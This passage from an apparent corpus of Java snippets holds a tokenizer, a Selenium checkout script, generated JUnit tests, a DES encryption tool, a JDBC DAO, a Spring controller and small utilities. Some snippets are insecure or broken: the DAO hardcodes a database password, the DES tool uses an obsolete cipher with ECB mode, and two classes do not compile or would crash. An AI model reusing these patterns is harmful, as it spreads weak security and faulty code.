(token.endsWith(\"\\\"\")) {\n                        System.out.println(\"Texto: \\\"\" + token + \"\\\"\");\n                        inString = false;\n                    } else {\n                        System.out.print(token + \" \");\n                    }\n                } else if (reservedWords.contains(token)) {\n                    System.out.println(\"Palavra reservada: \" + token);\n                } else if (operators.contains(token)) {\n                    System.out.println(\"Operador: \" + token);\n                } else if (token.matches(\"-?\\\\d+(\\\\.\\\\d+)?\")) { // CHECK inteiro ou decimal\n                    if (token.contains(\".\")) {\n                        System.out.println(\"N\u00famero decimal: \" + token);\n                    } else {\n                        System.out.println(\"N\u00famero inteiro: \" + token);\n                    }\n\n                } else if (token.startsWith(\"//\")) {\n                    System.out.println(\"Coment\u00e1rio: \" + token);\n                    break;\n                } else if (token.startsWith(\"\\\"\")) {\n                    if (token.endsWith(\"\\\"\")) {\n                        System.out.println(\"Texto: \\\"\" + token + \"\\\"\");\n                    } else {\n                        System.out.print(\"Texto: \\\"\" + token + \" \");\n                        inString = true;\n                    }\n                } else if (token.matches(\"[a-zA-Z_][a-zA-Z0-9_]*\")) {\n                    if (token.contains(\"_\")) {\n                        System.out.println(\"ID: \" + token);\n                    } else {\n                        System.out.println(\"Texto: \\\"\" + token + \"\\\"\");\n                    }\n                } else if (token.matches(\"[()\\\\[\\\\]{};,]\")) {\n                    System.out.println(\"S\u00edmbolo especial: \" + token);\n                } else {\n                    // invalido\n                    System.out.println(\"Token inv\u00e1lido: \" + token);\n                }\n            }\n        } else {\n            System.out.println(\"Entrada inv\u00e1lida.\");\n        }\n    \n    // Exibe a lista de tokens encontrada\n    System.out.println(); // Espaco vazio para melhor visulizacao\n    System.out.println(\"Lista de tokens:\");\n    for (String token : tokenList) {\n        System.out.println(token);\n            }\n        }\n    }\n}",
    "package org.swaglabs;\r\n\r\nimport java.io.File;\r\nimport java.io.IOException;\r\n\r\nimport org.apache.commons.io.FileUtils;\r\nimport org.openqa.selenium.By;\r\nimport org.openqa.selenium.OutputType;\r\nimport org.openqa.selenium.TakesScreenshot;\r\nimport org.openqa.selenium.WebDriver;\r\nimport org.openqa.selenium.WebElement;\r\nimport org.openqa.selenium.chrome.ChromeDriver;\r\n\r\npublic class SwagLab {\r\n\t\r\n\tpublic static WebDriver driver;\r\n\t\r\n\tpublic static void main(String[] args) throws IOException, InterruptedException {\r\n\t\t\r\n\tWebDriver driver = new ChromeDriver();\r\n\tdriver.get(\"https://www.saucedemo.com/v1/\");\r\n\tdriver.manage().window().maximize();\r\n\t\r\n\tWebElement userName = driver.findElement(By.xpath(\"//*[@id=\\\"user-name\\\"]\"));\r\n\tuserName.sendKeys(\"standard_user\");\r\n\t\r\n\tWebElement Password = driver.findElement(By.xpath(\"//*[@id=\\\"password\\\"]\"));\r\n\tPassword.sendKeys(\"secret_sauce\");\r\n\t\r\n\tTakesScreenshot ts=(TakesScreenshot)driver;\r\n\tFile source = ts.getScreenshotAs(OutputType.FILE);\r\n\tFile des =new File(\"C:\\\\Users\\\\leema\\\\eclipse-workspace\\\\Automate_swag\\\\swag\\\\loginpage.png\");\r\n\tFileUtils.copyFile(source, des);\r\n\t\r\n\tWebElement Login = driver.findElement(By.xpath(\"//*[@id=\\\"login-button\\\"]\"));\r\n\tLogin.click();\r\n\t\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"menu_button_container\\\"]/div/div[3]/div/button\")).click();\r\n\tThread.sleep(500);\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"inventory_sidebar_link\\\"]\")).click();\r\n\t\r\n\tTakesScreenshot ht=(TakesScreenshot)driver;\r\n\tFile cope = ht.getScreenshotAs(OutputType.FILE);\r\n\tFile one =new File(\"C:\\\\Users\\\\leema\\\\eclipse-workspace\\\\Automate_swag\\\\swag\\\\loginpage1.png\");\r\n\tFileUtils.copyFile(cope,one);\r\n\t\r\n\r\n\t\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"inventory_filter_container\\\"]/select\")).click();\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"inventory_container\\\"]/div/div[3]\")).click();\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"inventory_filter_container\\\"]/select/option[4]\")).click();\r\n\t\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"inventory_container\\\"]/div/div[6]/div[3]/button\")).click();\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"shopping_cart_container\\\"]\")).click();\r\n\t\r\n\tTakesScreenshot st=(TakesScreenshot)driver;\r\n\tFile copy = st.getScreenshotAs(OutputType.FILE);\r\n\tFile two =new File(\"C:\\\\Users\\\\leema\\\\eclipse-workspace\\\\Automate_swag\\\\swag\\\\loginpage2.png\");\r\n\tFileUtils.copyFile(copy,two);\r\n\t\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"item_2_title_link\\\"]/div\")).click();\r\n\t\r\n\tTakesScreenshot ms=(TakesScreenshot)driver;\r\n\tFile copee = ms.getScreenshotAs(OutputType.FILE);\r\n\tFile three =new File(\"C:\\\\Users\\\\leema\\\\eclipse-workspace\\\\Automate_swag\\\\swag\\\\loginpage3.png\");\r\n\tFileUtils.copyFile(copee,three);\r\n\t\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"inventory_item_container\\\"]/div/button\")).click();\r\n\t\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"cart_contents_container\\\"]/div/div[2]/a[2]\")).click();\r\n\t\r\n\tdriver.findElement(By.xpath(\"//input[@id=\\\"first-name\\\"]\")).sendKeys(\"leema\");\r\n\tdriver.findElement(By.xpath(\"//input[@id=\\\"last-name\\\"]\")).sendKeys(\"nancy\");\r\n\tdriver.findElement(By.xpath(\"//input[@id=\\\"postal-code\\\"]\")).sendKeys(\"600102\");\r\n\t\r\n\tTakesScreenshot ls=(TakesScreenshot)driver;\r\n\tFile copied = ls.getScreenshotAs(OutputType.FILE);\r\n\tFile four =new File(\"C:\\\\Users\\\\leema\\\\eclipse-workspace\\\\Automate_swag\\\\swag\\\\loginpage4.png\");\r\n\tFileUtils.copyFile(copied,four);\r\n\t\t\r\n\tdriver.findElement(By.xpath(\"//*[@id=\\\"checkout_info_container\\\"]/div/form/div[2]/input\")).click();\r\n\t\r\n\tdriver.findElement(By.linkText(\"FINISH\")).click();\r\n\t\r\n\tTakesScreenshot gs=(TakesScreenshot)driver;\r\n\tFile coss = gs.getScreenshotAs(OutputType.FILE);\r\n\tFile five =new File(\"C:\\\\Users\\\\leema\\\\eclipse-workspace\\\\Automate_swag\\\\swag\\\\loginpage5.png\");\r\n\tFileUtils.copyFile(coss,five);\r\n\t\r\n\t\r\n\tTakesScreenshot gh=(TakesScreenshot)driver;\r\n\tFile cossed = gs.getScreenshotAs(OutputType.FILE);\r\n\tFile six =new File(\"C:\\\\Users\\\\leema\\\\eclipse-workspace\\\\Automate_swag\\\\swag\\\\loginpage5.png\");\r\n\tFileUtils.copyFile(cossed,six);\r\n\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\r\n\t\r\n\t}\r\n\t\r\n\r\n\t\r\n\r\n}\r\n",
    "package ee.ut.cs.swt.nextdate;\n\nimport org.junit.Test;\nimport static org.junit.Assert.*;\n//The generated tests created by the TestSpark tool\npublic class GTv1 {\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate1() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(10, 10, 10);\n\t    String string0 = nextDate0.run(10, 31, 1970);\n\t    assertEquals(\"11/1/1970\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate0() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(12, 12, 12);\n\t    String string0 = nextDate0.run(12, 1839, 1839);\n\t    assertEquals(\"invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate3() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(9, 9, 9);\n\t    String string0 = nextDate0.run(9, 31, 1915);\n\t    assertEquals(\"Invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate2() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(23, 23, 23);\n\t    String string0 = nextDate0.run(3, 23, 1841);\n\t    assertEquals(\"3/24/1841\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate5() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(6, 6, 6);\n\t    String string0 = nextDate0.run(6, 30, 1882);\n\t    assertEquals(\"7/1/1882\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate4() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(11, 11, 11);\n\t    String string0 = nextDate0.run(11, 11, 1880);\n\t    assertEquals(\"11/12/1880\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testRunReturningNonEmptyString() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(2, 2, 2);\n\t    String string0 = nextDate0.run(2, 31, 1901);\n\t    assertEquals(\"Invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testRunWithNegative() throws Throwable {\n\t    NextDate nextDate0 = new NextDate((-112), (-112), (-112));\n\t    String string0 = nextDate0.run((-112), (-112), (-112));\n\t    assertEquals(\"invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testRunWithNegativeAndNegative() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(12, 12, 12);\n\t    String string0 = nextDate0.run((-441), 12, (-441));\n\t    assertEquals(\"invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testRunWithPositive1() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(12, 12, 12);\n\t    String string0 = nextDate0.run(12, 12, 12);\n\t    assertEquals(\"invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate14() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(4, 4, 4);\n\t    String string0 = nextDate0.run(4, 4, 1970);\n\t    assertEquals(\"4/5/1970\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testRunWithPositive0() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(290, 290, 290);\n\t    String string0 = nextDate0.run(290, 290, 290);\n\t    assertEquals(\"invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate13() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(8, 8, 8);\n\t    String string0 = nextDate0.run(8, 8, 1826);\n\t    assertEquals(\"8/9/1826\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testRunWithPositive2() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(1, 1, 1);\n\t    String string0 = nextDate0.run(1, 1, 2022);\n\t    assertEquals(\"invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate7() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(7, 7, 7);\n\t    String string0 = nextDate0.run(7, 7, 1930);\n\t    assertEquals(\"7/7/1930\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate6() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(12, 12, 12);\n\t    String string0 = nextDate0.run(12, 12, 1839);\n\t    assertEquals(\"12/13/1839\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate9() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(2, 2, 2);\n\t    String string0 = nextDate0.run(2, 28, 1879);\n\t    assertEquals(\"3/1/1879\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate8() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(2, 2, 2);\n\t    String string0 = nextDate0.run(2, 2, 1819);\n\t    assertEquals(\"2/3/1819\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate10() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(2, 2, 2);\n\t    String string0 = nextDate0.run(2, 29, 1882);\n\t    assertEquals(\"Invalid Input Date\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate12() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(5, 5, 5);\n\t    String string0 = nextDate0.run(5, 5, 1939);\n\t    assertEquals(\"5/6/1939\", string0);\n\t}\n\n\t@Test(timeout = 4000)\n\tpublic void testCreatesNextDate11() throws Throwable {\n\t    NextDate nextDate0 = new NextDate(1, 1, 1);\n\t    String string0 = nextDate0.run(1, 1, 2000);\n\t    assertEquals(\"1/2/2000\", string0);\n\t}\n\n}",
    "public class MedicalTestAnalyzer {\n\n  public static Map<TestResultRange, TestResultStats> analyze(List<Double> results) {\n    Map<TestResultRange, TestResultStats> resultsMap = new HashMap<>();\n    for (double value : results) {\n      TestResultRange range = getTestResultRange(value);\n      TestResultStats stats = resultsMap.get(range);\n      if (stats == null) {\n        stats = new TestResultStats();\n        resultsMap.put(range, stats);\n      }\n      stats.count++;\n      stats.totalValue += value;\n    }\n    return resultsMap;\n  }\n\n  private static TestResultRange getTestResultRange(double value) {\n    if (value < normalRangeLow) {\n      return TestResultRange.LOW;\n    } else if (value > normalRangeHigh) {\n      return TestResultRange.HIGH;\n    } else {\n      return TestResultRange.NORMAL;\n    }\n  }\n\n  static final double normalRangeLow = /* Define normal range low value */;\n  static final double normalRangeHigh = /* Define normal range high value */;\n\n  enum TestResultRange {\n    LOW,\n    NORMAL,\n    HIGH\n  }\n\n  static class TestResultStats {\n    int count;\n    double totalValue;\n\n    double getAverageValue() {\n      return count > 0 ? totalValue / count : 0.0;\n    }\n  }\n}\n",
    "import java.util.*;\n\nclass Movie {\n    private String title;\n    private String rating;\n    private double ratingValue;\n\n    public Movie(String title, String rating, double ratingValue) {\n        this.title = title;\n        this.rating = rating;\n        this.ratingValue = ratingValue;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public String getRating() {\n        return rating;\n    }\n\n    public double getRatingValue() {\n        return ratingValue;\n    }\n}\n\npublic class MovieRatingAnalyzer {\n    public static void main(String[] args) {\n        // Sample movie ratings\n        List<Movie> movies = new ArrayList<>();\n        movies.add(new Movie(\"Movie 1\", \"PG\", 4.5));\n        movies.add(new Movie(\"Movie 2\", \"PG-13\", 3.8));\n        movies.add(new Movie(\"Movie 3\", \"R\", 4.2));\n        movies.add(new Movie(\"Movie 4\", \"PG\", 3.9));\n        movies.add(new Movie(\"Movie 5\", \"PG-13\", 4.1));\n        movies.add(new Movie(\"Movie 6\", \"R\", 3.7));\n\n        // Calculate movie ratings statistics\n        Map<String, Integer> categoryCounts = new HashMap<>();\n        Map<String, Double> categoryTotalRatings = new HashMap<>();\n\n        for (Movie movie : movies) {\n            String ratingCategory = movie.getRating();\n            double ratingValue = movie.getRatingValue();\n\n            // Update category counts\n            categoryCounts.put(ratingCategory, categoryCounts.getOrDefault(ratingCategory, 0) + 1);\n\n            // Update category total ratings\n            categoryTotalRatings.put(ratingCategory, categoryTotalRatings.getOrDefault(ratingCategory, 0.0) + ratingValue);\n        }\n\n        // Calculate average rating for each category\n        Map<String, Double> categoryAverageRatings = new HashMap<>();\n        for (String category : categoryCounts.keySet()) {\n            int count = categoryCounts.get(category);\n            double totalRating = categoryTotalRatings.get(category);\n            double avgRating = totalRating / count;\n            categoryAverageRatings.put(category, avgRating);\n        }\n\n        // Print movie ratings statistics\n        System.out.println(\"Movie Ratings Statistics:\");\n        for (String category : categoryCounts.keySet()) {\n            int count = categoryCounts.get(category);\n            double avgRating = categoryAverageRatings.get(category);\n            System.out.println(\"Category: \" + category);\n            System.out.println(\"Number of Movies: \" + count);\n            System.out.println(\"Average Rating: \" + avgRating);\n            System.out.println();\n        }\n    }\n}\n",
    "package net.mappa.electrodomestiks;\n\npublic class Electrodomestic {\n    protected String brand;\n    protected String model;\n    protected float weight;\n    protected int power;\n    protected boolean isOn;\n\n    public Electrodomestic(String brand, String model, float weight, int power) {\n        this.brand = brand;\n        this.model = model;\n        this.weight = weight;\n        this.power = power;\n    }\n\n    public String getBrand() {\n        return this.brand;\n    }\n\n    public void setBrand(String brand) {\n        this.brand = brand;\n    }\n\n    public String getModel() {\n        return this.model;\n    }\n\n    public void setModel(String model) {\n        this.model = model;\n    }\n\n    public float getWeight() {\n        return this.weight;\n    }\n\n    public void setWeight(float weight) {\n        this.weight = weight;\n    }\n\n    public int getPower() {\n        return this.power;\n    }\n\n    public void setPower(int power) {\n        this.power = power;\n    }\n\n    public void turnOn() {\n        this.isOn = true;\n    }\n\n    public void turnOff() {\n        this.isOn = false;\n    }\n\n    public String isTurnOn() {\n        if (this.isOn) {\n            return \"Si\";\n        } else {\n            return \"No\";\n        }\n    }\n}\n",
    "package com.company;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.io.*;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Scanner;\n\npublic class DES {\n\n    public static void main(String[] args) {\n        try {\n            Scanner scanner = new Scanner(System.in);\n\n            // Input fields for original text and secret key\n            System.out.print(\"Enter the original text: \");\n            String originalText = scanner.nextLine();\n\n            System.out.print(\"Enter the secret key (8 characters): \");\n            String key = scanner.nextLine();\n\n            if (key.length() != 8) {  //tik 8 simbol gali buti\n                System.out.println(\"Error: Secret key must be exactly 8 characters long.\");\n                return;\n            }\n\n            // Choice of function encryption/decryption\n            System.out.print(\"Choose encryption (E) or decryption (D): \");\n            String choice = scanner.nextLine();\n\n            // Choice of encryption mode\n            System.out.print(\"Choose encryption mode (ECB, CBC, CFB): \");\n            String mode = scanner.nextLine();\n\n            // DES encryption/decryption\n            byte[] result;\n            if (choice.equalsIgnoreCase(\"E\")) {\n                result = encrypt(originalText, key, mode);\n                System.out.println(\"Encrypted text: \" + bytesToHex(result));//result\n\n                // Option to save encrypted text to a file\n                System.out.print(\"Do you want to save the encrypted text to a file? (Yes/No): \");\n                String saveChoice = scanner.nextLine();//pasirinkimas\n                if (saveChoice.equalsIgnoreCase(\"Yes\")) {\n                    System.out.print(\"Enter the file path to save encrypted text: \");\n                    String saveFilePath = scanner.nextLine();//nuskaito failo kelia\n                    saveToFile(result, saveFilePath);//text encrypt->File\n                    System.out.println(\"Encrypted text successfully saved to file.\");\n                }\n            } else if (choice.equalsIgnoreCase(\"D\")) {\n                // Reading ciphertext from a file for decryption\n                System.out.print(\"Enter the file path to read ciphertext from: \");\n                String filePath = scanner.nextLine();//nuskaito failo kelia\n                byte[] encryptedData = readFromFile(filePath);//skaito kas ten faile\n                if (encryptedData != null) {\n                    result = decrypt(encryptedData, key, mode);\n                    if (result != null) {\n                        System.out.println(\"Decrypted text: \" + new String(result, StandardCharsets.UTF_8));//decrypted\n                    } else {\n                        System.out.println(\"Error: Failed to decrypt the ciphertext.\");\n                    }\n                } else {\n                    System.out.println(\"Error: Failed to read ciphertext from the file.\");\n                }\n            } else {\n                System.out.println(\"Invalid choice. Program exits.\");\n            }\n        } catch (Exception e) { //isimtis\n            e.printStackTrace();\n        }\n    }\n//en\n    public static byte[] encrypt(String originalText, String key, String mode) throws Exception {//// \u0160ifruoja original\u0173 tekst\u0105 (throws) I\u0161meta i\u0161imt\u012f, jei \u0161ifravimo metu \u012fvyksta klaida.\n\n        Cipher cipher = Cipher.getInstance(\"DES/\" + mode + \"/PKCS5Padding\");//Sukuria \u0161ifravimo objekt\u0105 \u0161ifravimui.PKCS5Padding naudojamas duomen\u0173 vientisumui ir saugumui u\u017etikrinti, kai \u0161ifruojamas DES re\u017eimu.\n        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), \"DES\");//// Konvertuoja slapt\u0105j\u012f rakt\u0105 \u012f SecretKeySpec objekt\u0105.//StandardCharsets.UTF_8 naudojamas slaptam raktui konvertuoti i\u0161 eilut\u0117s \u012f bait\u0173 sek\u0105.\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);//// Inicijuoja \u0161ifr\u0105 su slaptu \u0161ifravimo raktu.\n        return cipher.doFinal(originalText.getBytes(StandardCharsets.UTF_8));//// \u0160ifruoja pradin\u012f tekst\u0105 ir gr\u0105\u017eina u\u017e\u0161ifruotus baitus.\n    }\n\n    public static byte[] decrypt(byte[] ciphertext, String key, String mode) {\n        try {\n            Cipher cipher = Cipher.getInstance(\"DES/\" + mode + \"/PKCS5Padding\");\n            SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), \"DES\");\n            cipher.init(Cipher.DECRYPT_MODE, secretKey);\n            return cipher.doFinal(ciphertext);\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n    // Funkcija bytesToHex konvertuoja bait\u0173 masyv\u0105 \u012f \u0161e\u0161ioliktain\u0119 eilut\u0119.\n    public static String bytesToHex(byte[] bytes) {\n        StringBuilder result = new StringBuilder();\n        for (byte b : bytes) {                          //kartojasi per kiekvien\u0105 masyvo bait\u0105\n            result.append(String.format(\"%02X\", b)); //Kiekvienas baitas formatuojamas \u012f dviej\u0173 skaitmen\u0173 \u0161e\u0161ioliktain\u012f skai\u010di\u0173 naudojant \u0161\u012f metod\u0105\n        }\n        return result.toString();\n    }\n\n    public st",
    "import java.sql.Connection;\r\nimport java.sql.DriverManager;\r\nimport java.sql.PreparedStatement;\r\nimport java.sql.SQLException;\r\n\r\npublic class DepartmentDAO {\r\n\r\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/departments\";\r\n    private static final String DB_USER = \"vineela\";\r\n    private static final String DB_PASSWORD = \"vineela@1234\";\r\n\r\n    public void saveDepartment(Department department) {\r\n        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD)) {\r\n            String query = \"INSERT INTO department (id, name) VALUES (?, ?)\";\r\n            PreparedStatement preparedStatement = conn.prepareStatement(query);\r\n            preparedStatement.setInt(1, department.getId());\r\n            preparedStatement.setString(2, department.getName());\r\n            preparedStatement.executeUpdate();\r\n            System.out.println(\"Department saved successfully.\");\r\n        } catch (SQLException e) {\r\n            System.err.println(\"Error occurred while saving department: \" + e.getMessage());\r\n        }\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        // Example usage:\r\n        DepartmentDAO departmentDAO = new DepartmentDAO();\r\n        Department department = new Department(1, \"IT\");\r\n        departmentDAO.saveDepartment(department);\r\n    }\r\n}\r\n\r\nclass Department {\r\n    private int id;\r\n    private String name;\r\n\r\n    public Department(int id, String name) {\r\n        this.id = id;\r\n        this.name = name;\r\n    }\r\n\r\n    public int getId() {\r\n        return id;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n}",
    "package ma.emsi.gestionhop.web;\n\nimport lombok.AllArgsConstructor;\nimport ma.emsi.gestionhop.entities.Patient;\nimport ma.emsi.gestionhop.repository.PatientRepos;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\n\nimport java.util.List;\n\n@Controller\n@AllArgsConstructor\npublic class PatientController {\n\n    private PatientRepos patR;\n\n    @GetMapping(\"/index\")\n    //on doit creer une vue\n    public String index(Model model, @RequestParam(name=\"page\",defaultValue = \"0\")int page,//page prend le parametre not\u00e9 p\n                        @RequestParam(name=\"size\",defaultValue = \"2\")int size ,\n                        @RequestParam(name = \"keyword\",defaultValue = \"\")String kw) //pas forcement de faire ?page=0&size=2\n    {\n\n        //page pour la pagination\n        //Page<Patient> pageP=patR.findAll(PageRequest.of(page,size));\n        Page<Patient> pageP=patR.findByNomContains(kw,PageRequest.of(page,size));\n        model.addAttribute(\"ListePatients\",pageP.getContent());\n        model.addAttribute(\"pages\", new int[pageP.getTotalPages()]);\n        model.addAttribute(\"pageCurrent\",page);\n        model.addAttribute(\"keyword\",kw);\n        return \"patients\";\n    }\n\n    @GetMapping(\"/delete\")\n    public String delete(Long id,String keyword,int page){\n        patR.deleteById(id);\n        return \"redirect:/index?page=\"+page+\"&keyword=\"+keyword;\n    }\n}\n",
    "import java.io.BufferedReader;\r\nimport java.io.BufferedWriter;  \r\nimport java.io.FileReader;\r\nimport java.io.FileWriter;\r\n\r\npublic class Main {\r\n\r\n    public static final int ID_WIDTH = 13; \r\n    public static final int ITEM_NAME_WIDTH = 15;\r\n    public static final int QUANTITY_WIDTH = 15; \r\n    public static final int PRICE_WIDTH = 15;\r\n    public static void main(String[] args)  throws Exception{ \r\n    String filePath = \"D:\\\\Groceries.txt\";\r\n    String fileToWriter = \"D:\\\\GroceriesFormatted.txt\";\r\n\r\n    String [] array = new String[4];\r\n    int id;\r\n    String itemName;\r\n    String quantity;\r\n    double price;\r\n    String separator = \",\";\r\n    double total = 0;\r\n\r\n    FileReader fileReader = new FileReader(filePath);\r\n    FileWriter fileWriter = new FileWriter(fileToWriter);\r\n    BufferedReader reader = new BufferedReader(fileReader);\r\n    BufferedWriter writer = new BufferedWriter(fileWriter);\r\n\r\n    writer.write( \"*******************************************************\");\r\n    String heading = formatLine(\"ID#\", ID_WIDTH)\r\n                   + formatLine(\"Item\", ITEM_NAME_WIDTH)\r\n                   + formatLine(\"Quantity\", QUANTITY_WIDTH)\r\n                   + formatLine(\"Price (\u20ac)\", PRICE_WIDTH);\r\n    System.out.println(heading); \r\n    writer.newLine();\r\n    writer.write(heading);\r\n    writer.newLine();\r\n    String line;\r\n\r\n    while((line = reader.readLine()) != null){\r\n        array = line.split(separator);\r\n\r\n        id = Integer.parseInt(array[0]);\r\n\r\n        itemName = array[1];\r\n\r\n        quantity = array[2];\r\n\r\n        price = Double.parseDouble(array[3]);\r\n\r\n        total += price;\r\n\r\n        line = formatLine(id, ID_WIDTH)\r\n             + formatLine(itemName, ITEM_NAME_WIDTH)\r\n             + formatLine(quantity, QUANTITY_WIDTH)\r\n             + formatLine(price, PRICE_WIDTH);\r\n       \r\n        System.out.println(line);\r\n        writer.write(line);\r\n        writer.newLine();\r\n       \r\n     \r\n       }\r\n\r\n    System.out.println(  \"The grocery shopping total is: \" + Math.round(total) + \"\u20ac\");\r\n    writer.write( \"*******************************************************\");\r\n    writer.newLine();\r\n    writer.write( \"The grocery shopping total is: \" + Math.round(total)+ \"\u20ac\");\r\n    writer.newLine();\r\n    writer.write( \"*******************************************************\");\r\n    writer.newLine();\r\n\r\n    reader.close();\r\n\r\n    writer.flush();\r\n\r\n    writer.close();}\r\n    private static String formatLine(Object value, int width) {\r\n        return String.format(\"%1$-\" + width + \"s\", value.toString());\r\n    }\r\n\r\n}\r\n",
    "public class Main2 {\r\n    public static void main(String[] args) {\r\n        Object lock = new Object();\r\n\r\n        Thread thread1 = new Thread(() -> {\r\n            synchronized (lock) {\r\n                for (int i = 0; i < 5; i++) {\r\n                    System.out.println(Thread.currentThread().getName());\r\n                    lock.notify();\r\n                    try {\r\n                        if (i < 4) {\r\n                            lock.wait();\r\n                        }\r\n                    } catch (InterruptedException e) {\r\n                        e.printStackTrace();\r\n                    }\r\n                }\r\n            }\r\n        }, \"\u041f\u043e\u0442\u043e\u043a \u041f\u0435\u0442\u044f\");\r\n\r\n        Thread thread2 = new Thread(() -> {\r\n            synchronized (lock) {\r\n                for (int i = 0; i < 5; i++) {\r\n                    System.out.println(Thread.currentThread().getName());\r\n                    lock.notify();\r\n                    try {\r\n                        if (i < 4) {\r\n                            lock.wait();\r\n                        }\r\n                    } catch (InterruptedException e) {\r\n                        e.printStackTrace();\r\n                    }\r\n                }\r\n            }\r\n        }, \"\u041f\u043e\u0442\u043e\u043a \u0412\u043e\u0432\u0430\");\r\n\r\n        thread1.start();\r\n        thread2.start();\r\n    }\r\n}\r\n",
    "package com.pack;\r\n\r\nimport java.text.DateFormat;\r\nimport java.text.ParseException;\r\nimport java.text.SimpleDateFormat;\r\nimport java.util.ArrayList;\r\nimport java.util.Calendar;\r\nimport java.util.Date;\r\n\r\npublic class DateDiff {\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t\tvoid maxDiff()\r\n\t\t{\r\n\t\t\t\r\n\t\t\tString string[] = {\"Mon Jan 02 15:17:50 IST 2023\",\r\n\t\t\t\t\t   \"Mon Jan 02 15:21:27 IST 2023\",\r\n\t\t\t\t\t   \"Mon Jan 02 15:25:02 IST 2023\",\r\n\t\t\t\t\t   \"Mon Jan 02 16:59:10 IST 2023\",\r\n\t\t\t\t\t   \"Tue Jan 03 16:09:31 IST 2023\",\r\n\t\t\t\t\t   \"Tue Jan 03 16:11:08 IST 2023\",\r\n\t\t\t\t\t   \"Tue Jan 03 16:13:53 IST 2023\"};\r\n\t\t\t\r\n\t\t\tArrayList list1 = new ArrayList<>();\r\n\t\t\t\r\n\t\t\tDateFormat formatter = new SimpleDateFormat(\"E MMM dd HH:mm:ss Z yyyy\");\r\n\t\t\tDate date = null;\r\n\t\t\ttry {\r\n\t\t\t\tfor (int i = 0; i < string.length; i++)\r\n\t\t\t\t{\r\n\t\t\t\t\tlist1.add((Date)formatter.parse(string[i]));\r\n\t\t\t \r\n\r\n\t\t\tCalendar cal = Calendar.getInstance();\r\n\t\t\tcal.setTime(date);\r\n\t\t\tString formatedDate = cal.get(Calendar.DATE) + \"/\" + \r\n\t\t\t                     (cal.get(Calendar.MONTH) + 1) + \"/\" +  \r\n\t\t\t\t\t             cal.get(Calendar.YEAR )+\" \"+ \r\n\t\t\t                     cal.get(Calendar.HOUR_OF_DAY)+\":\"+\r\n\t\t\t                     cal.get(Calendar.MINUTE)+\":\"+\r\n\t\t\t                     cal.get(Calendar.SECOND);\r\n\t\t\t\r\n\t\t\tSystem.out.println(\"formatedDate 